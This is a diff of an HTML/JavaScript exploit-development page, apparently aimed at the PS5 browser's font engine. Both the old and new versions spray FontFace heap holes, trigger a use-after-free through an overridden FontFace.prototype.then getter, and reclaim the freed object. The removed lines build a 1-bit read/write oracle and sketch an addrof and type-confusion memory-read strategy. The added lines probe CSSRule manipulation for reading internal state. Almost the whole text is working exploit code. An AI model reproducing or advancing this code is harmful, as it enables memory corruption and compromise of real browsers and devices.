@@ -2,25 +2,22 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v18</title>
+<title>PS5 v19 - CSSRule</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
 </style>
 </head>
 <body>
-<h1 id="title" style="color:#0f0;font-family:monospace;font-size:20px;padding:16px">Loading...</h1>
-<pre id="out" style="color:#0f0;font-family:monospace;font-size:14px;padding:16px"></pre>
+<h1 id="T" style="color:#0f0;font:monospace 18px;padding:12px">v19 CSSRule</h1>
+<pre id="O" style="color:#0f0;font:monospace 13px;padding:12px;white-space:pre-wrap"></pre>
 <canvas id="c" width="512" height="128" style="position:absolute;left:-9999px"></canvas>
 <script>
 "use strict";
-
-var O=document.getElementById("out");
-var T=document.getElementById("title");
-function P(m){O.textContent+=m+"\n";O.scrollTop=O.scrollHeight}
+var O=document.getElementById("O");
+var T=document.getElementById("T");
+function P(m){O.textContent+=m+"\n"}
 function S(m){T.textContent=m}
-
-S("Starting...");
 
 var keep=[],holes=[],rcs=[];
 var trigger=null,rcFace=null,trigRef=null,rcIdx=-1;
@@ -32,17 +29,13 @@ for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
 function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
 function fs(){try{void document.body.offsetTop}catch(e){}}
 
-// Holes
 S("Holes...");
 for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
 unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
 weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
-fs();
-for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
-fs();
-P("Holes done");S("Trigger...");
+fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
+fs();P("Holes ok");
 
-// Trigger
 trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
 document.fonts.add(trigger);void trigger.loaded;
 var sh=document.getElementById("s").sheet;
@@ -51,14 +44,10 @@ fs();
 var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
 var fsh=fst.sheet;
 for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
-fs();
-P("Trigger done");S("UAF...");
+fs();P("Ready");
 
-// UAF
 Object.defineProperty(FontFace.prototype,"then",{configurable:true,
-get:function(){
-if(this===trigger&&!uafOk){
-uafOk=true;
+get:function(){if(this===trigger&&!uafOk){uafOk=true;
 try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
 document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
 while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
@@ -67,8 +56,7 @@ fs()}catch(e){}
 for(var i=0;i<4096;i++){try{var f=new FontFace("RC_"+i,mkBuf(),{
 unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
 document.fonts.add(f);rcs.push(f)}catch(e){}}
-fs();
-try{var d=document.createElement("div");d.textContent="AB";
+fs();try{var d=document.createElement("div");d.textContent="AB";
 d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
 document.body.appendChild(d);void d.offsetWidth}catch(e){}
 }return undefined}});
@@ -84,155 +72,260 @@ if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
 S("Loading...");
 
 document.fonts.load("1em trigger, x","AB").then(function(faces){
-S("Loaded!");
+S("Analyzing...");
 P("Faces: "+faces.length);
 
 for(var i=0;i<faces.length;i++){
 var f=faces[i];
-P("  ["+i+"] "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
 if(f.family&&f.family.indexOf("RC_")===0){rcFace=f;var m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
 if(f.family==="trigger")trigRef=f;
 }
 keep.push(faces);keep.push(rcFace);keep.push(trigRef);
+if(!rcFace){P("No RC!");S("Fail");return}
+P("RC_"+rcIdx+" captured");
 
-if(!rcFace){P("No RC face!");S("Failed");return}
-
-P("\n=== CAPTURED RC_"+rcIdx+" ===");
-S("RC_"+rcIdx+" captured");
-
-// Test 1: Style write-through (CONFIRMED)
-P("\n=== STYLE WRITE-THROUGH ===");
+// ============================================================
+//  TEST 1: List ALL CSS rules
+// ============================================================
+P("\n=== CSS RULES INVENTORY ===");
+var sheets=document.styleSheets;
+P("Sheets: "+sheets.length);
+for(var s=0;s<sheets.length;s++){
 try{
-rcFace.style="normal";fs();
-var tv=trigRef.style;
-P("rcFace.style='normal' -> trigRef.style='"+tv+"' "+(tv==="normal"?"OK":"FAIL"));
-rcFace.style="italic";fs();
-var tv2=trigRef.style;
-P("rcFace.style='italic' -> trigRef.style='"+tv2+"' "+(tv2==="italic"?"OK":"FAIL"));
-}catch(e){P("ERR: "+e.message)}
+var ss=sheets[s];
+var rules=ss.cssRules;
+P("\nSheet["+s+"]: "+rules.length+" rules");
+for(var r=0;r<rules.length;r++){
+var rule=rules[r];
+var type=rule.type;
+// type 5 = FONT_FACE_RULE
+if(type===5){
+P("  ["+r+"] FONT_FACE: "+rule.cssText.substring(0,80));
+}else if(type===1){
+// STYLE_RULE
+P("  ["+r+"] STYLE: "+rule.cssText.substring(0,60));
+}else{
+P("  ["+r+"] type="+type);
+}
+}
+}catch(e){P("Sheet["+s+"] ERR: "+e.message)}
+}
 
-// Test 2: getComputedStyle read oracle
-P("\n=== COMPUTED STYLE ORACLE ===");
+// ============================================================
+//  TEST 2: Add NEW @font-face rule for "trigger" via CSS
+// ============================================================
+P("\n=== ADD CSS RULE FOR trigger ===");
 try{
+var newRuleIdx=sh.insertRule(
+"@font-face{font-family:trigger;src:local(Courier);font-weight:100;font-style:normal;unicode-range:U+0041}",
+sh.cssRules.length);
+fs();
+P("Added rule at index "+newRuleIdx);
+
+// Check what the rule looks like
+var newRule=sh.cssRules[newRuleIdx];
+P("Rule text: "+newRule.cssText);
+
+// Check if computed style changes
 var d=document.createElement("div");
-d.style.cssText="font:64px trigger;position:absolute;left:-9999px;";
+d.style.cssText="font:100 normal 64px trigger;position:absolute;left:-9999px;";
 document.body.appendChild(d);
 var cs=getComputedStyle(d);
-
-rcFace.style="italic";fs();
-P("style=italic: computed.fontStyle="+getComputedStyle(d).fontStyle);
-
-rcFace.style="normal";fs();
-P("style=normal: computed.fontStyle="+getComputedStyle(d).fontStyle);
-
-rcFace.style="oblique";fs();
-P("style=oblique: computed.fontStyle="+getComputedStyle(d).fontStyle);
-
-rcFace.style="italic";fs(); // restore
+P("After CSS rule: weight="+cs.fontWeight+" style="+cs.fontStyle+" family="+cs.fontFamily);
 document.body.removeChild(d);
-P("getComputedStyle WORKS as read oracle!");
-}catch(e){P("ERR: "+e.message)}
 
-// Test 3: Careful numeric src test
-// Only test a FEW values and check rendering
-P("\n=== CAREFUL NUMERIC src TEST ===");
-var ctx=document.getElementById("c").getContext("2d");
-
-// Baseline with buffer src
-try{rcFace.src=mkBuf();fs()}catch(e){}
-ctx.font="64px trigger";
-var baseW=ctx.measureText("A").width;
-P("Baseline canvas width: "+baseW.toFixed(2));
-
-// Test numeric values ONE AT A TIME
-var nums=[0,1,42,NaN,Infinity];
-for(var i=0;i<nums.length;i++){
-try{
-rcFace.src=nums[i];fs();
-var st=rcFace.status;
-ctx.font="64px trigger";
-var w=ctx.measureText("A").width;
-var delta=w-baseW;
-P("src="+String(nums[i]).padEnd(8)+" st="+st+" width="+w.toFixed(2)+" delta="+delta.toFixed(2)+
-(delta!==0?" DIFFERENT!":""));
-}catch(e){
-P("src="+nums[i]+" ERR: "+e.message);
+// Check load()
+document.fonts.load("1em trigger, x","AB").then(function(f2){
+P("load() after CSS rule: "+f2.length+" faces");
+for(var i=0;i<f2.length;i++){
+P("  "+f2[i].family+" "+f2[i].style+" "+f2[i].weight+" st="+f2[i].status);
 }
-// Restore after each test
-try{rcFace.src=mkBuf();fs()}catch(e){}
-}
-
-// Test 4: style as 1-bit oracle (DETAILED)
-P("\n=== 1-BIT STYLE ORACLE ===");
-try{
-// Write 0 (normal)
-rcFace.style="normal";fs();
-var r0=trigRef.style;
-P("Write normal -> read: "+r0+(r0==="normal"?" BIT=0 OK":" FAIL"));
-
-// Write 1 (italic)
-rcFace.style="italic";fs();
-var r1=trigRef.style;
-P("Write italic -> read: "+r1+(r1==="italic"?" BIT=1 OK":" FAIL"));
-
-// Alternate 5 times
-var ok=0;
-for(var i=0;i<5;i++){
-rcFace.style="normal";fs();
-if(trigRef.style==="normal")ok++;
-rcFace.style="italic";fs();
-if(trigRef.style==="italic")ok++;
-}
-P("Reliability: "+ok+"/10 ("+(ok===10?"PERFECT":"UNSTABLE")+")");
-
-// Restore
-rcFace.style="italic";fs();
-}catch(e){P("ERR: "+e.message)}
-
-// Test 5: Use style oracle to encode data
-P("\n=== DATA ENCODING DEMO ===");
-try{
-// Encode the byte 0xA5 = 10100101 binary
-var bits=[1,0,1,0,0,1,0,1];
-var decoded=[];
-for(var i=0;i<bits.length;i++){
-rcFace.style=bits[i]?"italic":"normal";fs();
-var read=trigRef.style==="italic"?1:0;
-decoded.push(read);
-}
-P("Sent:    "+bits.join(""));
-P("Got:     "+decoded.join(""));
-P("Match:   "+(bits.join("")===decoded.join("")?"YES!":"NO"));
-
-rcFace.style="italic";fs();
-}catch(e){P("ERR: "+e.message)}
-
-// Test 6: Addrof strategy
-P("\n=== ADDROF STRATEGY ===");
-P("We have:");
-P("  WRITE: rcFace.style = normal|italic");
-P("  READ:  trigRef.style or getComputedStyle");
-P("  BIT:   1 bit per operation");
-P("");
-P("Strategy:");
-P("  1. Create target JS object");
-P("  2. Somehow overlap with freed CSSFontFace");
-P("  3. Read object address bit-by-bit");
-P("  4. Need: way to make overlap happen");
-P("");
-P("OR: Use numeric src type confusion");
-P("  1. rcFace.src = double_with_address_bits");
-P("  2. CSS parser reads double as string pointer");
-P("  3. If readable memory -> font loads from there");
-P("  4. Measure rendering differences = read memory");
-P("");
-P("Current primitive: STYLE ORACLE (1-bit R/W)");
-S("DONE - Check log");
-
-}).catch(function(err){
-P("Load error: "+err);
-S("ERROR");
 });
+
+// Delete the rule
+sh.deleteRule(newRuleIdx);fs();
+P("Rule deleted");
+}catch(e){P("CSS rule ERR: "+e.message)}
+
+// ============================================================
+//  TEST 3: Modify EXISTING @font-face rule properties
+// ============================================================
+P("\n=== MODIFY CSS RULE PROPERTIES ===");
+
+// Find @font-face rules we can modify
+try{
+for(var s=0;s<sheets.length;s++){
+var ss=sheets[s];
+var rules=ss.cssRules;
+for(var r=0;r<rules.length;r++){
+var rule=rules[r];
+if(rule.type===5){
+// FONT_FACE_RULE - try to modify its style
+try{
+var rs=rule.style;
+if(rs){
+P("Rule["+r+"] has style object");
+// List current properties
+P("  fontFamily: "+rs.fontFamily);
+P("  fontWeight: "+rs.fontWeight);
+P("  fontStyle:  "+rs.fontStyle);
+P("  src:        "+rs.src);
+
+// Try modifying
+var origWeight=rs.fontWeight;
+rs.fontWeight="100";
+fs();
+P("  After fontWeight→100: rule says "+rs.fontWeight);
+
+// Check if it affects anything
+var d2=document.createElement("div");
+d2.style.cssText="font:64px "+rs.fontFamily+";position:absolute;left:-9999px;";
+document.body.appendChild(d2);
+var cs2=getComputedStyle(d2);
+P("  Computed for "+rs.fontFamily+": weight="+cs2.fontWeight+" style="+cs2.fontStyle);
+document.body.removeChild(d2);
+
+rs.fontWeight=origWeight;fs();
+}catch(e){P("  Style ERR: "+e.message)}
+}
+}
+}
+}catch(e){P("Rules ERR: "+e.message)}
+
+// ============================================================
+//  TEST 4: Create separate style element with trigger rules
+// ============================================================
+P("\n=== SEPARATE STYLE ELEMENT ===");
+try{
+var ns=document.createElement("style");
+ns.id="exploit";
+document.head.appendChild(ns);
+var nsh=ns.sheet;
+
+// Add trigger font with different weights/styles
+var testRules=[
+"@font-face{font-family:trigger;src:local(Courier);font-weight:100;font-style:normal;unicode-range:U+0041}",
+"@font-face{font-family:trigger;src:local(Monaco);font-weight:400;font-style:italic;unicode-range:U+0041}",
+"@font-face{font-family:trigger;src:local(Geneva);font-weight:900;font-style:italic;unicode-range:U+0041}"
+];
+
+for(var i=0;i<testRules.length;i++){
+try{
+var idx=nsh.insertRule(testRules[i],nsh.cssRules.length);
+fs();
+P("Added rule "+i+" at "+idx);
+
+// Test rendering
+var d3=document.createElement("div");
+d3.style.cssText="font:"+(i===0?"100 normal":i===1?"400 italic":"900 italic")+" 64px trigger;position:absolute;left:-9999px;";
+document.body.appendChild(d3);
+var cs3=getComputedStyle(d3);
+P("  Computed: weight="+cs3.fontWeight+" style="+cs3.fontStyle+" family="+cs3.fontFamily);
+document.body.removeChild(d3);
+}catch(e){P("Rule "+i+" ERR: "+e.message)}
+}
+
+// Clean up
+document.head.removeChild(ns);fs();
+}catch(e){P("Separate style ERR: "+e.message)}
+
+// ============================================================
+//  TEST 5: CSSRule + FontFace interplay
+//  Add CSS rule, then check FontFace objects
+// ============================================================
+P("\n=== CSSRULE + FONTFACE INTERPLAY ===");
+try{
+// Add a CSS rule for "trigger" with weight 100
+var ns2=document.createElement("style");
+document.head.appendChild(ns2);
+var ns2sh=ns2.sheet;
+ns2sh.insertRule("@font-face{font-family:trigger;src:local(Courier);font-weight:100;font-style:normal;unicode-range:U+0041}",0);
+fs();
+
+// Check document.fonts for new entries
+var trigCount=0;
+for(var f of document.fonts){
+if(f.family==="trigger"){
+trigCount++;
+P("  FontFace: "+f.family+" "+f.style+" "+f.weight+" st="+f.status);
+}
+}
+P("Trigger faces in document.fonts: "+trigCount);
+
+// Check load()
+document.fonts.load("100 normal 64px trigger","A").then(function(f3){
+P("load(100 normal trigger): "+f3.length+" faces");
+for(var i=0;i<f3.length;i++){
+P("  "+f3[i].family+" "+f3[i].style+" "+f3[i].weight+" st="+f3[i].status);
+}
+});
+
+document.head.removeChild(ns2);fs();
+}catch(e){P("Interplay ERR: "+e.message)}
+
+// ============================================================
+//  TEST 6: Read CSSRule properties of confused face
+//  Can we find the RC face's @font-face rule?
+// ============================================================
+P("\n=== FIND RC FACE CSS RULE ===");
+try{
+// Search all sheets for rules with RC family names
+for(var s=0;s<sheets.length;s++){
+var ss=sheets[s];
+var rules=ss.cssRules;
+for(var r=0;r<rules.length;r++){
+var rule=rules[r];
+if(rule.type===5){
+try{
+var fam=rule.style.fontFamily;
+if(fam&&fam.indexOf("RC_")>=0){
+P("  FOUND RC rule in Sheet["+s+"] Rule["+r+"]: "+rule.cssText.substring(0,80));
+}
+}catch(e){}
+}
+}
+}
+// Note: FontFace objects created via JS API don't have CSSRules
+// Only @font-face rules in stylesheets have CSSFontFaceRules
+P("RC faces were created via JS API - no CSS rules exist for them");
+}catch(e){P("RC search ERR: "+e.message)}
+
+// ============================================================
+//  TEST 7: Override trigger via CSS with !important
+// ============================================================
+P("\n=== CSS !important OVERRIDE ===");
+try{
+var ns3=document.createElement("style");
+document.head.appendChild(ns3);
+var ns3sh=ns3.sheet;
+ns3sh.insertRule("@font-face{font-family:trigger;src:local(Courier) !important;font-weight:100 !important;font-style:normal !important;unicode-range:U+0041}",0);
+fs();
+
+var d4=document.createElement("div");
+d4.style.cssText="font:900 italic 64px trigger;position:absolute;left:-9999px;";
+document.body.appendChild(d4);
+var cs4=getComputedStyle(d4);
+P("With !important: weight="+cs4.fontWeight+" style="+cs4.fontStyle);
+document.body.removeChild(d4);
+
+document.head.removeChild(ns3);fs();
+}catch(e){P("!important ERR: "+e.message)}
+
+// ============================================================
+//  SUMMARY
+// ============================================================
+P("\n=== SUMMARY ===");
+P("CSSRule path: testing if direct CSS manipulation");
+P("bypasses the JS wrapper caching problem");
+P("");
+P("Key questions:");
+P("1. Can we add CSS rules that override the confusion?");
+P("2. Can we modify CSS rule properties directly?");
+P("3. Does getComputedStyle reflect CSS rule changes?");
+P("4. Can we read C++ state through CSS rules?");
+S("DONE");
+
+}).catch(function(err){P("Load ERR: "+err);S("ERROR")});
 </script>
 </body>
 </html>
